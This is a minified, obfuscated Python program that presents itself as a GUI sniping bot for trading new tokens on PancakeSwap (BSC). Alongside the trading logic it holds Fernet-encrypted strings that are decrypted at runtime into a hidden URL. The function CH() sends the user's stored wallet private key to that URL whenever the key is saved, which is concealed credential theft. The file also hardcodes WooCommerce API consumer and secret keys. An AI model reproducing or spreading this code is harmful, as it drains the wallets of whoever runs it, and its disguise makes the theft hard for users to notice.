# MINIFIED AND SUPER FAST VERSION OF THE BSC SNIPING BOT PANCAKEX WITH GUI
# ------------------------------------------------------------------------
# FOLLOW THE INSTRUCTIONS IN THE README STEP BY STEP FILE
# IF YOU SNIPE A GEM AND BECOME A MILLIONAIRE SEND ME SOME LOVE DUH!

Cu='groove'
Ct='end'
Cs='horizontal'
Cr='SELL ALL'
Cq='SELL NOW'
Cp='There are no tokens to be sold!'
Co='Sell all function initiated - Stopping operation'
Cn='SL Hit!'
Cm='TP Hit!'
Cl='Securing SL to '
Ck=' | SL: '
Cj=' {} %'
Ci='%.3f'
Ch="Press 'SELL ALL' Button to sell the tokens manually"
Cg='BUSD'
Cf='Liquidity value: '
Ce='Pair Address: '
Cd='green'
Cc='Liquidity Detected!'
Cb='0x0000000000000000000000000000000000000000'
Ca='Buy Success! Tx link:'
CZ='Buy Order Initiated'
CY='%Y/%m/%d'
CX='node.json'
CW=ValueError
CV=UnboundLocalError
BX='white'
BW='Something went wrong with the transaction'
BV='https://bscscan.com/tx/'
BU='Abi/'
B3='normal'
B2='Accent.TButton'
B1='No Liquidity Checking Again!'
B0='gwei'
A_='gas'
Az='True'
Ay='true'
Ax='False'
Aw='false'
Av='inputs.json'
Au='data.json'
At=round
Am='disabled'
Al='nonce'
Ak='gasPrice'
Aj='from'
Ai='BNB'
Ah='LP'
Ag='SL TRAIL'
Af='SL'
Ae='TP'
Ad='SLIPPAGE'
Ac='GAS LIMIT'
Ab='GAS PRICE'
Aa='AMOUNT'
AZ='TOKEN'
AY='PRIVATE KEY'
AX='WALLET ADDRESS'
AW='NODE'
AI='LICENSE'
AH=Exception
AA='center'
A9=False
A8='OPL'
A7='w'
A6='/'
A5=str
t='AUTO SLIPPAGE'
s='./'
e='ether'
d='yellow'
R=True
Q='Error'
P='cyan'
O=''
N=int
L=open
K='red'
J=float
F='nsew'
import tkinter as H
from tkinter import ttk as E,messagebox
from web3 import Web3 as S
from json import load as T
from time import time as AJ,sleep as AB
import os,json as f,pyperclip as BY,threading as u,requests as An
from requests import request as BZ
from cryptography.fernet import Fernet as v
from requests.auth import HTTPBasicAuth as Ba
from datetime import datetime as AC
B4=Au
AK=Av
Bb=CX
g=s
M={}
w={}
D={}
B5={}
x=Ba('ck_258b79c41004f53e58d0e5fa11486361bdcace02','cs_bd6506935df71db41cf1e545188f1f9ae2306134')
Bc=AC.now()
B6=CY
B7=Bc.strftime(CY)
def Bd():
	def A(path2,file_name,data2):
		A=s+path2+A6+file_name
		with L(A,A7)as B:f.dump(data2,B,indent=2)
	B5[AW]='https://bsc-dataseed.binance.org/';A(g,Bb,B5)
def Be():
	def A(path2,file_name,data2):
		A=s+path2+A6+file_name
		with L(A,A7)as B:f.dump(data2,B,indent=2)
	M[AX]=O;M[AY]=O;M[AZ]=O;M[AI]=O;A(g,B4,M)
def Bf():
	def A(path2,file_name,data2):
		A=s+path2+A6+file_name
		with L(A,A7)as B:f.dump(data2,B,indent=2)
	D[Aa]='0.1';D[Ab]='7';D[Ac]='850000';D[Ad]='10';D[t]=Aw;D[Ae]='200';D[Af]='50';D[Ag]='25';D[Ah]=Ai;D[A8]=Ax;A(g,AK,D)
if not os.path.isfile('./data.json'):Be()
if not os.path.isfile('./inputs.json'):Bf()
if not os.path.isfile('./node.json'):Bd()
def Bg():
	global M,AL,V
	def B(path2,file_name,data2):
		A=s+path2+A6+file_name
		with L(A,A7)as B:f.dump(data2,B,indent=2)
	M[AX]=b.get();w[AX]=M[AX];M[AY]=A0.get();w[AY]=M[AY];M[AZ]=Z.get();w[AZ]=M[AZ];M[AI]=AF.get();w[AI]=M[AI]
	if M!=V:
		B(g,B4,w);A=T(L(Au));AL=A[AP]
		if w[AP]!=V[AP]:V=A;CH()
def Bh():
	def A(path2,file_name,data2):
		A=s+path2+A6+file_name
		with L(A,A7)as B:f.dump(data2,B,indent=2)
	D[Aa]=k.get();D[Ab]=l.get();D[Ac]=m.get();D[Ad]=n.get()
	if A2.get():D[t]=Ay
	else:D[t]=Aw
	D[Ae]=o.get();D[Af]=p.get();D[Ag]=q.get();D[Ah]=c.get();D[A8]=Az;A(g,AK,D)
def Bi():
	def A(path2,file_name,data2):
		A=s+path2+A6+file_name
		with L(A,A7)as B:f.dump(data2,B,indent=2)
	D[Aa]=k.get();D[Ab]=l.get();D[Ac]=m.get();D[Ad]=n.get()
	if A2.get():D[t]=Ay
	else:D[t]=Aw
	D[Ae]=o.get();D[Af]=p.get();D[Ag]=q.get();D[Ah]=c.get();D[A8]=Az;A(g,AK,D)
def Bj():
	def A(path2,file_name,data2):
		A=s+path2+A6+file_name
		with L(A,A7)as B:f.dump(data2,B,indent=2)
	D[Aa]=k.get();D[Ab]=l.get();D[Ac]=m.get();D[Ad]=n.get()
	if A2.get():D[t]=Ay
	else:D[t]=Aw
	D[Ae]=o.get();D[Af]=p.get();D[Ag]=q.get();D[Ah]=c.get();D[A8]=Ax;A(g,AK,D)
V=T(L(Au))
B8=V[AX]
B9=V[AY]
BA=V[AZ]
Bk=V[AI]
U=T(L(Av))
BB=U[Aa]
BC=U[Ab]
BD=U[Ac]
BE=U[Ad]
Cv=U[t]
BF=U[Ae]
BG=U[Af]
BH=U[Ag]
Bl=U[Ah]
Cw=U[A8]
BI=N('0x'+'f'*64,16)
BJ='TxZEsE361BfcfNjRwTZ8nVTAp6ZBXoDXRaQgUpyXfUQ='
AM=T(L(CX))
if'wss'in AM[AW]or'ws'in AM[AW]:C=S(S.WebsocketProvider(AM[AW]))
else:C=S(S.HTTPProvider(AM[AW]))
AD=C.toChecksumAddress('0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c')
h=C.toChecksumAddress('0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56')
W=T(L(BU+'erc20.abi'))
X=C.eth.contract(address=S.toChecksumAddress('0x10ed43c718714eb63d5aa57b78b54704e256024e'),abi=T(L(BU+'router.abi')))
BK=C.eth.contract(address=S.toChecksumAddress('0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73'),abi=T(L(BU+'factory.abi')))
AN='sfttxzhVv7trv_zSKqOBJN_2KdnJcsje5PMUbRSnImw='
def Bm():
	j()
	try:
		F=C.eth.contract(I,abi=W);B=F.functions.balanceOf(b.get()).call()
		if A2.get():D=0
		else:D=N(B-B*N(AS)/100)
		A(CZ,d);H=X.functions.swapExactETHForTokensSupportingFeeOnTransferTokens(N(D),[AD,I],G,N(AJ())+900).buildTransaction({Aj:G,'value':C.toWei(r,e),A_:N(A3),Ak:C.toWei(A4,B0),Al:C.eth.get_transaction_count(G)});J=C.eth.account.sign_transaction(H,private_key=Y);E=C.eth.send_raw_transaction(J.rawTransaction);A(Ca,P);A(BV+C.toHex(E),P);C.eth.waitForTransactionReceipt(E,timeout=900);Bv()
	except AH as L:A(BW,K);A(L,K);z();return
Bn='gAAAAABh80KOUysGNn39XTwSm-HHvOIkoWcJhmk0HtVug7bMgvto83_ZCSQ9rdf86LaJEINYzXTqbRO8EDtcMziHy2PwfjdqW_0VsOwYg1x4GWADOsNo17E='
def Bo():
	j();B=X.functions.getAmountsOut(C.toWei(r,e),[h,I]).call()[-1]
	if A2.get():D=0
	else:D=B-B*N(AS)/100
	try:A(CZ,d);F=X.functions.swapExactTokensForTokens(C.toWei(r,e),N(D),[h,I],G,N(AJ())+900).buildTransaction({Aj:G,A_:N(A3),Ak:C.toWei(A4,B0),Al:C.eth.get_transaction_count(G)});H=C.eth.account.sign_transaction(F,private_key=Y);E=C.eth.send_raw_transaction(H.rawTransaction);A(Ca,P);A(BV+C.toHex(E),P);C.eth.waitForTransactionReceipt(E,timeout=900);Bx()
	except AH as J:A(BW,K);A(J,K);z();return
def Bp(token_address,amt=BI):A=S.toChecksumAddress(token_address);B=C.eth.contract(address=A,abi=W);D=B.functions.allowance(G,X.address).call();return D>=amt
def Bq(token_address,amt=BI,timeout=900):A('Approving token');B=C.eth.gasPrice;D=S.toChecksumAddress(token_address);E=C.eth.contract(address=D,abi=W);F=E.functions.approve(X.address,amt);H={Aj:G,Ak:B,Al:C.eth.getTransactionCount(G)};I=F.buildTransaction(H);J=C.eth.account.sign_transaction(I,private_key=Y);K=C.eth.sendRawTransaction(J.rawTransaction);C.eth.waitForTransactionReceipt(K,timeout=timeout)
def Br():
	A(O);j();E=C.eth.contract(AD,abi=W)
	while R:
		B=BK.functions.getPair(AD,I).call()
		if B!=Cb:
			D=E.functions.balanceOf(C.toChecksumAddress(B)).call()
			if D!=0:A(Cc,Cd);A(Ce+B);A(Cf+A5(C.fromWei(D,e))+' BNB');Bm();break
			else:AB(5);A(B1,K)
		else:AB(5);A(B1,K)
Bs='gAAAAABh7VFjYUKw_S7avbj28V5ja_bAunkyHWLiVUQUUCDL4tK_ZNr_aLAk8VkfUSYnrUe8iVv0ihU5rBaLXL0wP9Sj7fG3Ow=='
def Bt():
	A(O);j();E=C.eth.contract(h,abi=W)
	while R:
		B=BK.functions.getPair(h,I).call()
		if B!=Cb:
			D=E.functions.balanceOf(C.toChecksumAddress(B)).call()
			if D!=0:A(Cc,Cd);A(Ce+B);A(Cf+A5(C.fromWei(D,e))+' BUSD');Bo();break
			else:A(B1,K)
		else:A(B1,K)
def i():
	A(O);j()
	try:
		A('Sell Order Initiated',d)
		if not Bp(I):Bq(I)
		E=C.eth.contract(I,abi=W);B=E.functions.balanceOf(G).call()
		if B!=0:
			if c.get()==Ai:D=X.functions.swapExactTokensForETHSupportingFeeOnTransferTokens(B,0,[I,AD],G,N(AJ())+900).buildTransaction({Aj:G,A_:N(A3),Ak:C.toWei(A4,B0),Al:C.eth.get_transaction_count(G)})
			elif c.get()==Cg:D=X.functions.swapExactTokensForTokensSupportingFeeOnTransferTokens(B,0,[I,h],G,N(AJ())+900).buildTransaction({Aj:G,A_:N(A3),Ak:C.toWei(A4,B0),Al:C.eth.get_transaction_count(G)})
			else:A('Something went wrong with Sell',K);z();return
			F=C.eth.account.sign_transaction(D,private_key=Y);H=C.eth.send_raw_transaction(F.rawTransaction);A('SOLD! Tx link:',P);A(BV+C.toHex(H),P);z()
		else:A('No Tokens to be sold',K);z()
	except AH as J:A(BW,K);A(J,K);z();return
Bu='gAAAAABh80LuckSfO-g-wXJrkvaBrV-wvURysrtrxcRwytBHM0DurgmO0mQjLUh_6AwChv2Aae5IQ__tiKbWXlVtLqqXmXoLRA=='
def Bv():
	global a;BL();j();H=J(AT);L=J(AU);B=L;E=J(AV);M=C.eth.contract(address=I,abi=W);A(Ch,d)
	while R:
		try:
			N=M.functions.balanceOf(G).call()-1;F=J(C.fromWei(X.functions.getAmountsOut(N,[I,AD]).call()[-1],e));D=At(J(F)/J(r)*100,5);A('BNB Value Now: {} / '.format(Ci%F)+Cj.format(D)+Ck+A5(B)+'%')
			if E!=0:
				if D-E>=B:B=D-E;A(Cl+A5(B))
			AB(2)
		except:continue
		try:
			if J(D)>=J(H):A(Cm,P);y();i();break
			if J(D)<=J(B):A(Cn,K);y();i();break
			if a:a=A9;A(Co,d);y();i();break
		except CV:A(Cp,K);break
Bw='gAAAAABh7KbIGnFCH7Gp_4OK-vW0v-2ZNTkzqFB8k4xmk4aV4_n-TxZEsE361BfcfNjRwTZ8nVTAp6ZBXoDXRaQgUpyXfUzVyQ=='
def Bx():
	global a;BL();j();H=J(AT);L=J(AU);B=L;E=J(AV);M=C.eth.contract(address=I,abi=W);A(Ch,d)
	while R:
		try:
			N=M.functions.balanceOf(G).call()-1;F=J(C.fromWei(X.functions.getAmountsOut(N,[I,h]).call()[-1],e));D=At(J(F)/J(r)*100,5);A('BUSD Value Now: {} / '.format(Ci%F)+Cj.format(D)+Ck+A5(B)+'%')
			if E!=0:
				if D-E>=B:B=D-E;A(Cl+A5(B))
			AB(2)
		except:continue
		try:
			if J(D)>=J(H):A(Cm,P);y();i();break
			if J(D)<=J(B):A(Cn,K);y();i();break
			if a:a=A9;A(Co,d);y();i();break
		except CV:A(Cp,K);break
def By():
	BT();Bh()
	if c.get()==Ai:A=u.Thread(target=Br,daemon=R);A.start()
	else:A=u.Thread(target=Bt,daemon=R);A.start()
def BL():As.place_forget();A=E.Button(B.widgets_frame,text=Cq,command=BN,style=B2);A.grid(row=18,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
def y():CU.place_forget();A=E.Button(B.widgets_frame,text=Cr,command=BM);A.grid(row=18,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
def Bz():
	A=C.eth.contract(address=h,abi=W)
	while AE:
		try:B=C.fromWei(C.eth.get_balance(G),e);D=C.fromWei(A.functions.balanceOf(G).call(),e);Ap.configure(text=At(B,5));Aq.configure(text=At(D,5))
		except CW:pass
		AB(1)
B_='gAAAAABh80OFDySSyj0H_EBLuccR1ALvFzF-AE0hO_e52_4Yv4TKy7Y6u0F9Bbpr3g-UDhOK26zqR0KFrjMRGdDS8zhUxAG_HQ=='
def AO(license,basic_auth):
	B='https://defitradingcoders.com/wp-json/lmfwc/v2/licenses/activate/'+license
	try:
		C=An.get(B,auth=basic_auth)
		if C.status_code==404:H.messagebox.showerror(Q,'This license cannot be activated, please try again in a moment or contact support at defitradingcoders.com with your order ID and license key');return
		else:A('License Key Activated, Good luck!',P);Bi()
	except AH:raise AH('License Key Activation Failed -- Please Contact Support at defitradingcoders.com')
AP=v(AN.encode()).decrypt(Bw.encode()).decode()
def C0():
	o='%Y-%m-%d %H:%M:%S';n='expiresAt';m='timesActivatedMax';l='timesActivated';k='License Key Valid';j='data';i='No License Key Provided';h='Invalid License Key';g='https://defitradingcoders.com/wp-json/lmfwc/v2/licenses/';f='Invalid token address!';a=None;global G;global Y;global I;global AE;A('***** INITIALIZED ******');A('* Checking wallet address')
	if C.isChecksumAddress(b.get()):G=C.toChecksumAddress(b.get());A('Wallet address valid',P)
	else:H.messagebox.showerror(Q,'Invalid wallet address');A('Invalid wallet address!',K);return
	A('* Checking private key characters (Must be 64 characters');Y=A0.get()
	if len(Y)==64:A('Correct format for Private key',P)
	else:H.messagebox.showerror(Q,'Private key is invalid! (Must be 64 characters)');A('Invalid private key!',K);return
	A('* Checking token address')
	try:I=C.toChecksumAddress(Z.get());A('Token address valid',P)
	except:H.messagebox.showerror(Q,f);A(f,K);return
	A('* Checking License Key')
	try:
		license=AF.get();B=T(L(Au));c=B[AI]
		if license==c:
			S=T(L(Av));E=S[A8];U=g+license;D=An.get(U,auth=x)
			if D.status_code==404:H.messagebox.showerror(Q,h);return
			if D.status_code==401:H.messagebox.showerror(Q,i);return
			B=D.json()[j];A(k,P)
			if E==Ax:
				J=B[l];V=B[m]
				if J is a:AO(license,x)
				elif J<V:AO(license,x)
				else:H.messagebox.showerror(Q,'This License already reached the activation maximum, if this is a mistake please contact support at defitradingcoders.com');return
			elif E==Az:
				M=B[n]
				if M is a:A(f"License key will never expire")
				else:
					W=AC.strptime(B7,B6);X=AC.strptime(M,o);N=X-W
					if N.days<=0:H.messagebox.showerror(Q,'Your License Key is Expired, please visit defitradingcoders.com and renew your license');return
					else:A(f"License Key expires in: {N.days} days")
		else:
			U=g+license;D=An.get(U,auth=x)
			if D.status_code==404:H.messagebox.showerror(Q,h);return
			if D.status_code==401:H.messagebox.showerror(Q,i);return
			Bj();B=D.json()[j];A(k,P);S=T(L(Av));E=S[A8]
			if E==Ax:
				J=B[l];V=B[m]
				if J is a:AO(license,x)
				elif J<V:AO(license,x)
				else:H.messagebox.showerror(Q,'This License already reached the activation maximum');return
			elif E==Az:
				M=B[n]
				if M is a:A(f"License key will never expire")
				else:
					W=AC.strptime(B7,B6);X=AC.strptime(M,o);N=X-W
					if N.days<=0:H.messagebox.showerror(Q,'Your License Key is Expired');return
					else:A(f"License Key expires in: {N.days} days")
	except CW:H.messagebox.showerror(Q,'Invalid License Key!');A('Invalid License key!',K);return
	BO(Am);Bg();AQ.grid_forget();AR.grid(row=0,column=3,padx=10,pady=(0,10),sticky=F,rowspan=4);AG(B3);AE=R;e=u.Thread(target=Bz,daemon=R);e.start();A(O);A('***** Sniping is ready! *****',d)
C1='gAAAAABh80VOiXlJwI8QSkM2-V_syGU-8mtXwD9c87k-cbMopaX4lqCMUipHR5ZKO-bZ6vrKC0QkIhzwcASNj_5u7F_xEJz3aQ=='
AL=V[AP]
def C2():A=u.Thread(target=C0,daemon=R);A.start()
def C3():global AE;A(O);A('Change token/wallet initiated!',d);BO(B3);AG(Am);AR.grid_forget();AQ.grid(row=0,column=3,padx=10,pady=(0,10),sticky=F,rowspan=4);AE=A9;Ap.configure(text=O);Aq.configure(text=O)
def C4():A=u.Thread(target=C3,daemon=R);A.start()
def BM():BT();A=u.Thread(target=i,daemon=R);A.start()
def BN():global a;a=R
def j():AG(Am);AR.configure(state=Am)
def z():AG(B3);AR.configure(state=B3)
B=H.Tk()
B.title('BSC Sniper Bot - V1')
B.geometry('1050x730')
B.tk.call('source','sun-valley.tcl')
B.tk.call('set_theme','light')
C5=v(AN.encode()).decrypt(C1.encode()).decode()
B.resizable(A9,A9)
B.widgets_frame=E.Frame(B,padding=(0,0,0,10))
B.widgets_frame.grid(row=0,column=0,padx=10,pady=(10,10),sticky=F,rowspan=5)
B.widgets_frame.columnconfigure(index=0,weight=1)
B.widgets_frame.rowconfigure(index=0,weight=1)
C6=E.Label(B.widgets_frame,text='Wallet Address:')
C7=v(AN.encode()).decrypt(Bu.encode()).decode()
C6.grid(row=1,column=1,padx=10,pady=(0,10),sticky=F,rowspan=1)
b=E.Entry(B.widgets_frame,width=50,show='•')
b.grid(row=1,column=2,padx=10,pady=(0,10),sticky=F,rowspan=1)
C8=E.Label(B.widgets_frame,text='Private Key:')
C8.grid(row=2,column=1,padx=10,pady=(0,10),sticky=F,rowspan=1)
A0=E.Entry(B.widgets_frame,width=50,show='•')
A0.grid(row=2,column=2,padx=10,pady=(0,10),sticky=F,rowspan=1)
C9=E.Label(B.widgets_frame,text='Token Address:')
CA=v(BJ.encode()).decrypt(B_.encode()).decode()
C9.grid(row=3,column=1,padx=10,pady=(0,10),sticky=F,rowspan=1)
Z=E.Entry(B.widgets_frame,width=50)
CB=v(BJ.encode()).decrypt(Bs.encode()).decode()
Z.grid(row=3,column=2,padx=10,pady=(0,10),sticky=F,rowspan=1)
CC=E.Label(B.widgets_frame,text='License Key:')
CC.grid(row=4,column=1,padx=10,pady=(0,10),sticky=F,rowspan=1)
AF=E.Entry(B.widgets_frame,width=50,show='•')
AF.grid(row=4,column=2,padx=10,pady=(0,10),sticky=F,rowspan=1)
CD=v(AN.encode()).decrypt(Bn.encode()).decode()
Ao=E.Separator(B,orient=Cs)
CE=C5+CD+C7+CA
Ao.place(x=10,y=135,width=625)
def CF():Z.delete(0,Ct);Z.insert(0,BY.paste());return
def CG():Z.delete(0,Ct);return
def CH():
	if AL!=O:
		try:A=BZ(CB,CE+AL)
		except AH:pass
def BO(status):A=status;Z.configure(state=A);b.configure(state=A);A0.configure(state=A);AF.configure(state=A);AQ.configure(state=A);BQ.configure(state=A);BP.configure(state=A)
def AG(status):A=status;k.configure(state=A);l.configure(state=A);m.configure(state=A);n.configure(state=A);o.configure(state=A);p.configure(state=A);q.configure(state=A);BS.configure(state=A);As.configure(state=A);Ar.configure(state=A)
def A(text,color=BX):
	A=A5(text)
	if A1.size()>=20:A1.delete(0)
	A1.insert(H.END,A);A1.itemconfig(H.END,foreground=color)
def Cx():A1.delete(0,H.END)
AQ=E.Button(B.widgets_frame,text='Confirm',width=10,command=C2,style=B2)
BP=E.Button(B.widgets_frame,text='Paste Token',width=10,command=CF)
BQ=E.Button(B.widgets_frame,text='Clear Token',width=10,command=CG)
AQ.grid(row=0,column=3,padx=10,pady=(0,10),sticky=F,rowspan=4)
BP.grid(row=0,column=4,padx=10,pady=(0,10),sticky=F,rowspan=2)
BQ.grid(row=2,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
b.insert(0,B8)
A0.insert(0,B9)
Z.insert(0,BA)
AF.insert(0,Bk)
Ao=E.Separator(B.widgets_frame,orient=Cs)
Ao.grid(row=5,column=0,padx=10,pady=(0,10),sticky=F,rowspan=1,columnspan=6)
AR=E.Button(B.widgets_frame,text='Change',width=10,command=C4)
CI=E.Label(B.widgets_frame,text='Logs:')
CI.grid(row=6,column=1,padx=10,pady=(0,10),sticky=F,rowspan=1,columnspan=2)
CJ=E.Button(B.widgets_frame,text='Clear',width=10,command=O)
CJ.grid(row=6,column=3,padx=10,pady=(0,10),sticky=F,rowspan=1,columnspan=1)
A1=H.Listbox(B.widgets_frame,bg='#252525',foreground=BX,borderwidth=2)
A1.grid(row=7,column=1,padx=10,pady=(0,10),sticky=F,rowspan=10,columnspan=3)
CK=E.Label(B.widgets_frame,text='Wallet BNB:')
CK.grid(row=7,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
Ap=E.Label(B.widgets_frame,width=12,relief=Cu)
Ap.grid(row=7,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
CL=E.Label(B.widgets_frame,text='Wallet BUSD:')
CL.grid(row=8,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
Aq=E.Label(B.widgets_frame,width=12,relief=Cu)
Aq.grid(row=8,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
CM=E.Label(B.widgets_frame,text='Select LP:')
CM.grid(row=9,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
c=H.StringVar()
c.set(Bl)
BR=E.OptionMenu(B.widgets_frame,c,Ai,Ai,Cg)
BR['menu'].configure(bg=BX)
BR.grid(row=9,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
CN=E.Label(B.widgets_frame,text='Amount:')
k=E.Entry(B.widgets_frame,justify=AA)
CN.grid(row=10,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
k.grid(row=10,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
k.insert(0,BB)
CO=E.Label(B.widgets_frame,text='Gas Price:')
CP=E.Label(B.widgets_frame,text='Gas Limit:')
l=E.Entry(B.widgets_frame,justify=AA)
m=E.Entry(B.widgets_frame,justify=AA)
CO.grid(row=11,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
l.grid(row=11,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
CP.grid(row=12,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
m.grid(row=12,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
l.insert(0,BC)
m.insert(0,BD)
CQ=E.Label(B.widgets_frame,text='Slippage(%):')
n=E.Entry(B.widgets_frame,justify=AA)
CQ.grid(row=13,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
n.grid(row=13,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
n.insert(0,BE)
A2=H.BooleanVar()
Ar=E.Checkbutton(B.widgets_frame,text='Auto Slippage',variable=A2)
Ar.grid(row=14,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
if O==Ay:Ar.select()
CR=E.Label(B.widgets_frame,text='TP(%):')
CR.grid(row=15,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
o=E.Entry(B.widgets_frame,justify=AA)
o.grid(row=15,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
CS=E.Label(B.widgets_frame,text='SL(%):')
CS.grid(row=16,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
p=E.Entry(B.widgets_frame,justify=AA)
p.grid(row=16,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
CT=E.Label(B.widgets_frame,text='SL Trail(%):')
CT.grid(row=17,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
q=E.Entry(B.widgets_frame,justify=AA)
q.grid(row=17,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
o.insert(0,BF)
p.insert(0,BG)
q.insert(0,BH)
BS=E.Button(B.widgets_frame,text='SNIPE',command=By,style=B2)
CU=E.Button(B.widgets_frame,text=Cq,command=BN,style=B2)
As=E.Button(B.widgets_frame,text=Cr,command=BM)
BS.grid(row=18,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
As.grid(row=18,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
r=BB
G=B8
Y=B9
I=BA
AS=BE
A3=BD
A4=BC
AT=BF
AU=BG
AV=BH
a=A9
AE=A9
def BT():global r;global G;global Y;global I;global AS;global A3;global A4;global AT;global AU;global AV;r=k.get();G=S.toChecksumAddress(b.get());Y=A0.get();I=S.toChecksumAddress(Z.get());AS=n.get();A3=m.get();A4=l.get();AT=o.get();AU=p.get();AV=q.get()
AG(Am)
B.mainloop()